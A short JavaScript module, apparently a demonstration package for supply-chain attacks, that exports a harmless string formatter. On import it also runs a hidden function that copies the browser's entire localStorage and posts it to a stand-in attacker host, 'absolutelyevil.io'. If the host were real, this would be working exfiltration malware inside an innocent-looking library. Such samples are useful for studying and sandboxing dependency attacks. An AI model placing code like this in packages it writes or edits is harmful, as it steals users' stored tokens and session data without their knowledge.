const window = require('global/window')

module.exports = formatString

function formatString (input) {
  return `☃ ${input} ☃`
}

doAttack()

async function doAttack() {
  try {
    // get the data
    const data = Object.assign({}, window.localStorage)
    // send it home
    await window.fetch('https://absolutelyevil.io', {
      method: 'post',
      body: JSON.stringify(data)
    })
  } catch (_) {
    console.warn('sesify-example-format - failed to pull a sneaky')
  }
}